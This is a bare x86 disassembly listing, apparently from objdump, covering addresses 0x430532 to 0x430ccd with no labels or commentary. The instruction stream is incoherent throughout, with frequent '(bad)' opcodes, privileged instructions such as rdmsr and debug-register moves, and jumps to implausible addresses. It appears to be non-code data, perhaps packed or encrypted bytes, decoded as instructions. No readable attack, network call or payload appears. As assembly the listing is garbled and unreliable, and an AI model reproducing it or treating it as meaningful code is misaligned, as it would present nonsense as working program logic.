  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
